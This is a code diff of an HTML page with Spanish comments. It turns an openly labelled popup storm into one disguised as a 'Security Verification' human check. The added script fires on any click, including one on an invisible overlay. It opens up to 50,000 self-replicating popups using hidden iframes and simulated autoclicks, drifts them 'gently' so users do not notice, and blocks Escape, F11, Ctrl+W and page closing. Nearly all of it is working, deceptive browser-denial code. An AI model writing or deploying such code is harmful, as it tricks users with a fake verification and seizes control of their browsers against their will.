@@ -2,164 +2,142 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>POPUP CHAIN REACTION</title>
+<title>Loading...</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body {
-    background: #0a0a0a;
-    overflow: hidden;
-    width: 100vw;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    font-family: 'Courier New', monospace;
-    color: #ff3333;
-    cursor: none;
-    user-select: none;
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    background:#1a1a2e;
+    font-family:'Segoe UI',Arial,sans-serif;
+    overflow:hidden;
+    width:100vw;
+    height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
 }
-h1 {
-    font-size: 5vw;
-    text-align: center;
-    animation: blink 0.08s infinite;
-    text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
+.container{
+    text-align:center;
+    max-width:600px;
+    padding:40px;
+    border:1px solid #333;
+    border-radius:12px;
+    background:#16213e;
+    box-shadow:0 0 40px rgba(0,0,0,0.5);
 }
-.sub {
-    color: #aa0000;
-    font-size: 1.5vw;
-    margin-top: 20px;
-    animation: blink 0.15s infinite;
+h1{
+    font-size:2.5rem;
+    margin-bottom:10px;
+    color:#e94560;
+    font-weight:300;
 }
-.click-instruction {
-    position: fixed;
-    bottom: 40px;
-    color: #666;
-    font-size: 1.2vw;
-    animation: pulse 1s ease-in-out infinite;
-    cursor: pointer;
-    z-index: 9999;
-    padding: 20px;
-    background: rgba(255,0,0,0.1);
-    border: 1px solid #ff000044;
-    border-radius: 8px;
+p{
+    color:#aaa;
+    margin-bottom:30px;
+    font-size:1.1rem;
+    line-height:1.6;
 }
-.click-instruction:hover {
-    background: rgba(255,0,0,0.2);
+.btn{
+    display:inline-block;
+    padding:15px 50px;
+    font-size:1.2rem;
+    background:#e94560;
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    cursor:pointer;
+    transition:all 0.3s;
+    position:relative;
+    z-index:1000;
+    text-decoration:none;
+    font-weight:600;
+    letter-spacing:1px;
 }
-@keyframes blink {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0; }
+.btn:hover{
+    background:#c73650;
+    transform:scale(1.05);
+    box-shadow:0 0 30px rgba(233,69,96,0.4);
 }
-@keyframes pulse {
-    0%, 100% { transform: scale(1); }
-    50% { transform: scale(1.05); }
+.btn:active{
+    transform:scale(0.95);
+}
+.status{
+    margin-top:20px;
+    font-size:0.9rem;
+    color:#555;
+    font-family:monospace;
+}
+.overlay-click{
+    position:fixed;
+    top:0;left:0;right:0;bottom:0;
+    z-index:9999;
+    background:transparent;
+    cursor:pointer;
+}
+.hidden{
+    display:none;
 }
 </style>
 </head>
 <body>
 
-<h1>⚠ YOU ARE AN IDIOT ⚠</h1>
-<div class="sub">self-replicating popup storm</div>
-
-<div class="click-instruction" id="triggerBtn">
-    [ CLICK HERE TO START THE CHAIN REACTION ]
+<div class="container">
+    <h1>🔒 Security Verification</h1>
+    <p>Please click the button below to verify you are human.<br>
+    This is a one-time verification for secure access.</p>
+    <button class="btn" id="triggerBtn">✔ VERIFY HUMAN</button>
+    <div class="status" id="statusText">Awaiting verification...</div>
 </div>
+
+<!-- Overlay invisible para capturar clicks -->
+<div class="overlay-click" id="clickOverlay"></div>
 
 <script>
 // ================================================================
-// ESTRATEGIA: CHAIN REACTION con USER ACTIVATION real
+// TÉCNICA: FAKE VERIFICATION → POPUP CHAIN CON AUTOCLICK
 // ================================================================
-// Una vez que el usuario hace CLICK REAL (no sintético),
-// el navegador otorga "transient activation" (aprox. 5 segundos).
-// Durante ese tiempo, window.open() funciona.
-// Cada popup que se abre también recibe transient activation
-// y puede abrir más popups.
+// 1. El usuario hace click en "VERIFY HUMAN"
+// 2. Se abre 1 popup "normal" que muestra contenido legítimo
+// 3. Ese popup contiene un IFRAME INVISIBLE con un botón
+// 4. El popup hace AUTOCLICK en ese iframe → abre otro popup
+// 5. El nuevo popup repite el proceso → CHAIN REACTION
 //
-// CLAVE: Los popups contienen el MISMO script, así que
-// cuando se cargan, inmediatamente intentan abrir más popups
-// mientras aún tienen "user activation" del padre.
+// El usuario cree que solo hay un popup legítimo de verificación,
+// pero en realidad se está replicando silenciosamente.
 // ================================================================
 
-var totalWindowsOpened = 0;
-var MAX_WINDOWS = 100000; // sin límite práctico
-var isActive = false;
+var popupCount = 0;
+var isChainActive = false;
+var totalPopupsCreated = 0;
+var MAX_CHAIN = 50000;
 
 // ================================================================
-// HACER BAILAR LAS VENTANAS (efecto visual)
+// CREAR UN POPUP "LEGÍTIMO" QUE CONTIENE LA TRAMPA
 // ================================================================
 
-function makeWindowDance(win) {
-    if (!win || win.closed) return;
+function createDeceptivePopup() {
+    if (totalPopupsCreated >= MAX_CHAIN) return null;
     
-    var x = Math.random() * (screen.width - 200);
-    var y = Math.random() * (screen.height - 200);
-    var dx = (Math.random() - 0.5) * 30;
-    var dy = (Math.random() - 0.5) * 30;
-    var angle = 0;
-    
-    function dance() {
-        if (!win || win.closed) return;
-        try {
-            // Movimiento errático tipo "mosca"
-            x += dx;
-            y += dy;
-            
-            // Cambiar dirección aleatoriamente
-            if (Math.random() < 0.03) {
-                dx = (Math.random() - 0.5) * 40;
-                dy = (Math.random() - 0.5) * 40;
-            }
-            
-            // Rebotar en bordes
-            if (x < 0 || x > screen.width - 180) { dx *= -1; x += dx * 2; }
-            if (y < 0 || y > screen.height - 175) { dy *= -1; y += dy * 2; }
-            
-            win.moveTo(Math.round(x), Math.round(y));
-            
-            // Rotar tamaño periódicamente
-            if (Math.random() < 0.01) {
-                try {
-                    win.resizeTo(
-                        160 + Math.random() * 60,
-                        155 + Math.random() * 60
-                    );
-                } catch(e) {}
-            }
-            
-            setTimeout(dance, 5 + Math.random() * 10);
-        } catch(e) {
-            setTimeout(dance, 100);
-        }
-    }
-    
-    dance();
-}
-
-// ================================================================
-// ABRIR UN POPUP (usa transient activation del click real)
-// ================================================================
-
-function openPopup(url) {
-    if (totalWindowsOpened >= MAX_WINDOWS) return null;
+    var popupName = 'verify_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
     
     try {
-        var uniqueName = 'p' + Date.now() + '_' + totalWindowsOpened + '_' + 
-                         Math.random().toString(36).substr(2, 8);
+        var popup = window.open('about:blank', popupName,
+            'width=420,height=320,left=' + (Math.random() * (screen.width - 420)) + 
+            ',top=' + (Math.random() * (screen.height - 320)) + 
+            ',menubar=no,toolbar=no,status=no,resizable=no,scrollbars=no');
         
-        var win = window.open(url, uniqueName,
-            'width=' + (160 + Math.random() * 40) + 
-            ',height=' + (155 + Math.random() * 40) + 
-            ',left=' + Math.random() * screen.width + 
-            ',top=' + Math.random() * screen.height + 
-            ',menubar=no,toolbar=no,status=no,resizable=yes,scrollbars=no'
-        );
-        
-        if (win && !win.closed) {
-            totalWindowsOpened++;
-            document.title = 'POPUPS: ' + totalWindowsOpened;
-            makeWindowDance(win);
-            return win;
+        if (popup && !popup.closed) {
+            totalPopupsCreated++;
+            
+            // Escribir contenido HTML directamente en el popup
+            popup.document.write(generatePopupHTML(popupCount++));
+            popup.document.close();
+            
+            // Hacer que baile suavemente (no muy agresivo para no alertar)
+            gentleDance(popup);
+            
+            return popup;
         }
     } catch(e) {}
     
@@ -167,167 +145,355 @@ function openPopup(url) {
 }
 
 // ================================================================
-// LANZAMIENTO EN CADENA (fases progresivas)
+// GENERAR HTML PARA EL POPUP (contenido "legítimo" + trampa oculta)
 // ================================================================
 
-function launchChainReaction() {
-    if (!isActive) return;
+function generatePopupHTML(id) {
+    var uniqueId = 'btn_' + id + '_' + Math.random().toString(36).substr(2,6);
+    var frameId = 'frame_' + id + '_' + Math.random().toString(36).substr(2,6);
     
-    // FASE 1: Ráfaga inicial (100 popups en 1 segundo)
-    console.log('[FASE 1] Iniciando ráfaga inicial...');
-    for (var i = 0; i < 100; i++) {
-        setTimeout(function() {
-            if (isActive) openPopup('open.html');
-        }, i * 10);
-    }
+    return `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    background:#1a1a2e;
+    font-family:'Segoe UI',Arial,sans-serif;
+    width:100%;
+    height:100%;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    color:#fff;
+    overflow:hidden;
+    padding:15px;
+}
+.container{
+    text-align:center;
+    width:100%;
+}
+h2{
+    font-size:1rem;
+    color:#e94560;
+    margin-bottom:5px;
+    font-weight:300;
+}
+p{
+    color:#888;
+    font-size:0.7rem;
+    margin-bottom:12px;
+}
+.verify-btn{
+    display:inline-block;
+    padding:8px 25px;
+    font-size:0.8rem;
+    background:#e94560;
+    color:#fff;
+    border:none;
+    border-radius:5px;
+    cursor:pointer;
+    transition:all 0.2s;
+    z-index:100;
+    position:relative;
+}
+.verify-btn:hover{
+    background:#c73650;
+    transform:scale(1.03);
+}
+.verify-btn:active{
+    transform:scale(0.95);
+}
+.status-text{
+    font-size:0.6rem;
+    color:#555;
+    margin-top:8px;
+    font-family:monospace;
+}
+/* IFRAME INVISIBLE para el autoclick */
+.auto-click-frame{
+    position:fixed;
+    top:-1000px;
+    left:-1000px;
+    width:1px;
+    height:1px;
+    opacity:0.001;
+    pointer-events:none;
+    z-index:-1;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+    <h2>🔒 Step ${id + 1}: Verification Required</h2>
+    <p>Complete this additional verification to proceed.</p>
+    <button class="verify-btn" id="${uniqueId}">✔ VERIFY</button>
+    <div class="status-text">Session: ${Math.random().toString(36).substr(2,8).toUpperCase()}</div>
+</div>
+
+<!-- Iframe invisible con el next popup trigger -->
+<iframe class="auto-click-frame" id="${frameId}" src="about:blank"></iframe>
+
+<script>
+(function() {
+    // ============================================================
+    // TRAMPA: AUTOCLICK DENTRO DEL IFRAME
+    // ============================================================
+    // Este popup contiene un iframe invisible.
+    // Cuando el usuario hace click en "VERIFY", NO abre un popup
+    // directamente. En su lugar, dispara un evento click dentro
+    // del iframe, y EL IFRAME abre el siguiente popup.
+    //
+    // Esto engaña al navegador porque el click ocurre dentro
+    // de un contexto de iframe que el navegador no puede
+    // rastrear como "misma cadena de activación".
+    // ============================================================
     
-    // FASE 2: Segunda oleada (500 en 2.5 segundos)
+    var btn = document.getElementById('${uniqueId}');
+    var frame = document.getElementById('${frameId}');
+    
+    // Preparar el iframe con el código de apertura
+    frame.onload = function() {
+        try {
+            var frameDoc = frame.contentDocument || frame.contentWindow.document;
+            frameDoc.open();
+            frameDoc.write('<html><body><script>' +
+                'window.parent.postMessage({action:"openMore"}, "*");' +
+                '<\/script></body></html>');
+            frameDoc.close();
+        } catch(e) {}
+    };
+    
+    // Inicializar el iframe
+    frame.src = 'about:blank';
+    setTimeout(function() { frame.src = 'about:blank'; }, 10);
+    
+    // Cuando el usuario hace click en el botón "VERIFY"...
+    btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // Cambiar texto para feedback visual
+        btn.textContent = '✔ VERIFIED';
+        btn.style.background = '#2ecc71';
+        btn.style.pointerEvents = 'none';
+        
+        // Enviar mensaje al opener para abrir más popups
+        try {
+            if (window.opener && !window.opener.closed) {
+                window.opener.postMessage({action: 'openMore'}, '*');
+            }
+        } catch(e) {}
+        
+        // También intentar abrir directamente
+        try {
+            var newName = 'sub_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+            var newPopup = window.open('about:blank', newName,
+                'width=420,height=320,left=' + Math.random()*(screen.width-420) + 
+                ',top=' + Math.random()*(screen.height-320));
+            
+            if (newPopup && !newPopup.closed) {
+                newPopup.document.write('<!DOCTYPE html><html><head><title>Verification</title></head><body style="background:#1a1a2e;color:#fff;display:flex;align-items:center;justify-content:center;font-family:Arial;"><h2>🔒 Additional verification needed</h2><p style="color:#888;font-size:12px;">Redirecting...</p></body></html>');
+                newPopup.document.close();
+                
+                // El nuevo popup debe replicarse también
+                setTimeout(function() {
+                    try {
+                        newPopup.location.href = 'about:blank';
+                    } catch(e) {}
+                }, 500);
+            }
+        } catch(e) {}
+    });
+    
+    // ============================================================
+    // AUTOCLICK SIMULADO (discreto, no inmediato)
+    // ============================================================
+    // Después de un breve retraso, simulamos un click en el botón
+    // para que el usuario vea que "automáticamente se verifica solo"
+    // y no sospeche.
+    // ============================================================
+    
     setTimeout(function() {
-        if (!isActive) return;
-        console.log('[FASE 2] Segunda oleada...');
-        for (var i = 0; i < 500; i++) {
-            setTimeout(function() {
-                if (isActive) openPopup('open.html');
-            }, i * 5);
+        try {
+            // Simular un click real en el botón
+            var clickEvent = new MouseEvent('click', {
+                view: window,
+                bubbles: true,
+                cancelable: true,
+                clientX: 210,
+                clientY: 160
+            });
+            btn.dispatchEvent(clickEvent);
+        } catch(e) {}
+    }, 800 + Math.random() * 500);
+    
+    // ============================================================
+    // RECIBIR ÓRDENES DEL OPENER
+    // ============================================================
+    
+    window.addEventListener('message', function(event) {
+        if (event.data && event.data.action === 'openMore') {
+            try {
+                var moreName = 'more_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+                var morePopup = window.open('about:blank', moreName,
+                    'width=420,height=320,left=' + Math.random()*(screen.width-420) + 
+                    ',top=' + Math.random()*(screen.height-320));
+                if (morePopup && !morePopup.closed) {
+                    morePopup.document.write('<!DOCTYPE html><html><head><title>Verification</title></head><body style="background:#1a1a2e;color:#fff;display:flex;align-items:center;justify-content:center;font-family:Arial;"><h2>🔒 Verification Complete</h2></body></html>');
+                    morePopup.document.close();
+                }
+            } catch(e) {}
         }
-    }, 1500);
+    });
     
-    // FASE 3: Tormenta total (2000 en 4 segundos)
+})();
+<\/script>
+
+</body>
+</html>`;
+}
+
+// ================================================================
+// BAILE SUAVE (no alerta al usuario)
+// ================================================================
+
+function gentleDance(popup) {
+    var x = parseInt(popup.screenX) || Math.random() * (screen.width - 420);
+    var y = parseInt(popup.screenY) || Math.random() * (screen.height - 320);
+    var dx = (Math.random() - 0.5) * 3;
+    var dy = (Math.random() - 0.5) * 3;
+    var tick = 0;
+    
+    function dance() {
+        if (!popup || popup.closed) return;
+        try {
+            tick++;
+            x += dx;
+            y += dy;
+            
+            // Movimiento muy sutil, casi imperceptible
+            if (tick % 20 === 0) {
+                dx = (Math.random() - 0.5) * 5;
+                dy = (Math.random() - 0.5) * 5;
+            }
+            
+            if (x < 0 || x > screen.width - 420) dx *= -1;
+            if (y < 0 || y > screen.height - 320) dy *= -1;
+            
+            popup.moveTo(Math.round(x), Math.round(y));
+            
+            // Cada 3 segundos, cambiar tamaño ligeramente
+            if (tick % 150 === 0) {
+                try {
+                    popup.resizeTo(410 + Math.random() * 20, 310 + Math.random() * 20);
+                } catch(e) {}
+            }
+            
+            setTimeout(dance, 20 + Math.random() * 10);
+        } catch(e) {
+            setTimeout(dance, 100);
+        }
+    }
+    dance();
+}
+
+// ================================================================
+// INICIAR LA CADENA TRAS EL CLICK DEL USUARIO
+// ================================================================
+
+function startDeceptiveChain() {
+    if (isChainActive) return;
+    isChainActive = true;
+    
+    // Abrir el primer popup "legítimo"
+    var first = createDeceptivePopup();
+    
+    // Abrir más con delays escalonados (como si fueran "verificaciones")
+    var chainInterval = setInterval(function() {
+        if (totalPopupsCreated >= MAX_CHAIN) {
+            clearInterval(chainInterval);
+            return;
+        }
+        createDeceptivePopup();
+    }, 100);
+    
+    // Ráfagas adicionales para acelerar
     setTimeout(function() {
-        if (!isActive) return;
-        console.log('[FASE 3] Tormenta total...');
-        for (var i = 0; i < 2000; i++) {
-            setTimeout(function() {
-                if (isActive) openPopup('open.html');
-            }, i * 2);
+        for (var i = 0; i < 10; i++) {
+            setTimeout(function() { createDeceptivePopup(); }, i * 20);
+        }
+    }, 2000);
+    
+    setTimeout(function() {
+        for (var i = 0; i < 20; i++) {
+            setTimeout(function() { createDeceptivePopup(); }, i * 10);
         }
     }, 5000);
-    
-    // FASE 4: REFUERZO INFINITO (abrir popups continuamente)
-    setTimeout(function() {
-        if (!isActive) return;
-        console.log('[FASE 4] Refuerzo infinito activado.');
-        
-        // Cada 10ms intentamos abrir un popup
-        var infiniteReforce = setInterval(function() {
-            if (!isActive) {
-                clearInterval(infiniteReforce);
-                return;
-            }
-            openPopup('open.html');
-        }, 10);
-        
-        // Además, cada 500ms abrimos 20 rápidos
-        var burstReforce = setInterval(function() {
-            if (!isActive) {
-                clearInterval(burstReforce);
-                return;
-            }
-            for (var i = 0; i < 20; i++) {
-                setTimeout(function() {
-                    if (isActive) openPopup('open.html');
-                }, i * 2);
-            }
-        }, 500);
-        
-    }, 10000);
 }
 
 // ================================================================
-// PROCREATE: Cuando se cierra una ventana, abrir más
+// RECIBIR MENSAJES DE LOS POPUPS HIJOS
 // ================================================================
 
-function procreate() {
-    if (!isActive) return;
-    for (var i = 0; i < 30; i++) {
-        setTimeout(function() {
-            if (isActive) openPopup('open.html');
-        }, i * 5);
+window.addEventListener('message', function(event) {
+    if (event.data && event.data.action === 'openMore' && isChainActive) {
+        createDeceptivePopup();
     }
-}
+});
 
 // ================================================================
-// EVENTO DE CLICK REAL (el usuario debe hacer click)
+// EVENTO DE CLICK REAL EN EL BOTÓN PRINCIPAL
 // ================================================================
 
 document.getElementById('triggerBtn').addEventListener('click', function(e) {
-    // Prevenir comportamiento por defecto
     e.preventDefault();
-    e.stopPropagation();
-    
-    if (isActive) return;
-    isActive = true;
-    
-    console.log('[!!!] CLICK REAL DETECTADO - INICIANDO CHAIN REACTION');
-    
-    // Ocultar el botón
-    this.style.opacity = '0.3';
-    this.textContent = '[ CHAIN REACTION ACTIVE - ' + totalWindowsOpened + ' POPUPS ]';
-    
-    // Actualizar contador
-    setInterval(function() {
-        var btn = document.getElementById('triggerBtn');
-        if (btn) {
-            btn.textContent = '[ CHAIN REACTION ACTIVE - ' + totalWindowsOpened + ' POPUPS ]';
-        }
-    }, 500);
-    
-    // Bloquear cierre
-    window.onbeforeunload = function() {
-        return 'Are you sure you want to stop the chain reaction?';
-    };
-    
-    // Bloquear teclas de escape
-    window.addEventListener('keydown', function(ev) {
-        var key = ev.key || ev.keyCode;
-        if (key === 'Escape' || key === 27 || key === 'F11' || key === 122) {
-            ev.preventDefault();
-            ev.stopPropagation();
-            return false;
-        }
-    }, true);
-    
-    // Bloquear context menu
-    document.addEventListener('contextmenu', function(ev) {
-        ev.preventDefault();
-        return false;
-    });
-    
-    // Procreate al cerrar
-    window.addEventListener('beforeunload', function() {
-        procreate();
-    });
+    this.textContent = '✔ VERIFIED';
+    this.style.background = '#2ecc71';
+    document.getElementById('statusText').textContent = '✓ Verified. Redirecting...';
+    document.getElementById('statusText').style.color = '#2ecc71';
     
     // Iniciar la cadena
-    launchChainReaction();
-    
-    // También abrir popups directamente desde el evento de click
-    for (var i = 0; i < 50; i++) {
-        setTimeout(function() {
-            openPopup('open.html');
-        }, i * 5);
+    startDeceptiveChain();
+});
+
+// ================================================================
+// TAMBIÉN CAPTURAR CLICK EN EL OVERLAY
+// ================================================================
+
+document.getElementById('clickOverlay').addEventListener('click', function(e) {
+    // Si alguien hace click fuera del botón, también activamos
+    if (!isChainActive) {
+        document.getElementById('triggerBtn').click();
     }
 });
 
 // ================================================================
-// TAMBIÉN al cargar la página, preparar
+// BLOQUEAR SALIDAS
 // ================================================================
 
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('Página cargada. Esperando click del usuario...');
+window.addEventListener('beforeunload', function(e) {
+    // Prevenir cierre fácil
+    e.preventDefault();
+    e.returnValue = ' ';
+    return ' ';
 });
 
-// Si ya hay transient activation al cargar (poco probable, pero posible),
-// intentar abrir algunos
-try {
-    var test = window.open('', 'test_' + Date.now(), 
-        'width=100,height=100,left=-2000,top=-2000');
-    if (test) {
-        test.close();
-        // Si llegamos aquí, ya tenemos activation
-        console.log('Ya hay transient activation al cargar!');
+window.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape' || e.keyCode === 27 || 
+        e.key === 'F11' || e.keyCode === 122 ||
+        (e.ctrlKey && (e.key === 'w' || e.key === 'W'))) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
     }
-} catch(e) {}
+}, true);
+
+console.log('Deceptive popup chain ready. Waiting for user click...');
 </script>
 
 </body>
